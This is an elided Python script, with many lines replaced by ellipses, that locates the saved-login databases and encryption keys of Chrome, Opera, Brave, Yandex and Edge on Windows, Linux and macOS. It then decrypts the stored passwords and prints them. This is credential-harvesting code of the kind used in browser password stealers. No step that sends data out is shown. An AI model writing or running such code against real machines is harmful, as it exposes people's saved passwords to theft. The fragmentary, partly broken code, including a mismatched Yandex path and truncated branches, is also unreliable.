...
class ChromeBase:
        ...
        def wrapper(*args):
            ...
            for ver in vers:
                for i in range(120):
                    ...
                    database_path = cls.browsers_database_paths[
                        base_name
                    ].format(ver=ver, profile=profile)
                    brw_path = cls.browsers_web_paths[base_name].format(
                        ver=ver, profile=profile
                    )

                    if os.path.exists(browser_path) and os.path.exists(
                        database_path
                    ):
    ...
    def retrieve_database(self) -> list:
        ...
        try:
            for (
                database_path
            ) in database_paths:  # Iterate on each available database
                ...
                for row in cursor.fetchall():
                    ...
                    if self.target_os == "Windows":
                        ...
                        self.target_os == "Linux" or self.target_os == "Darwin"
                    ):
                        password = self.decrypt_unix_password(
                            encrypted_password, key
                        )
                    ...
                    if created and created != 86400000000:
                        creation_time = str(
                            self.__class__.get_datetime(created)
                        )
...
class Windows(ChromeBase):
    def __init__(
        ...
        self.browsers_paths = {
            ...
            "brave": os.path.join(
                base_path,
                r"Local\\BraveSoftware\\{ver}\\User Data\\Local State",
            ),
            "yandex": os.path.join(
        ...
        self.browsers_database_paths = {
            "chrome": os.path.join(
                base_path,
                r"Local\\Google\\{ver}\\User Data\\{profile}\\Login Data",
            ),
            "opera": os.path.join(
                base_path,
                r"Roaming\\Opera Software\\{ver}{profile}\\Login Data",
            ),
            "brave": os.path.join(
                base_path,
            ...
            "yandex": os.path.join(
                base_path,
                r"Local\\Yandex\\{ver}\\User Data\\{profile}\\Local State",
            ),
            "msedge": os.path.join(
                base_path,
                r"Local\\Microsoft\\{ver}\\User Data\\{profile}\\Login Data",
            ),
        }
    ...
    def fetch(self):
        ...
        # Get the AES key
        self.keys = [
            self.__class__.get_encryption_key(path)
...
class Linux(ChromeBase):
    ...
    def __init__(
        ...
        self.browsers_database_paths = {
            ...
            "brave": base_path
            + "/.config/BraveSoftware/{ver}/{profile}/Login Data",
            "yandex": "",
            "msedge": "",
        }
        self.browsers_web_paths = {
...
class Mac(ChromeBase):
    ...
    def __init__(
        ...
        self.browsers_paths = {
            ...
            "opera": os.path.expanduser(
                "~/Library/Application Support/{ver}{profile}"
            ),
    ...
    def fetch(self):
        ...
        self.keys.append(
            PBKDF2(key, b"saltysalt", 16, 1003, hmac_hash_module=SHA1)
        )
        return self.database_paths, self.keys
...
for br in available_browsers:
    ...
    print(pax.retrieve_database())  # Get the data from the database
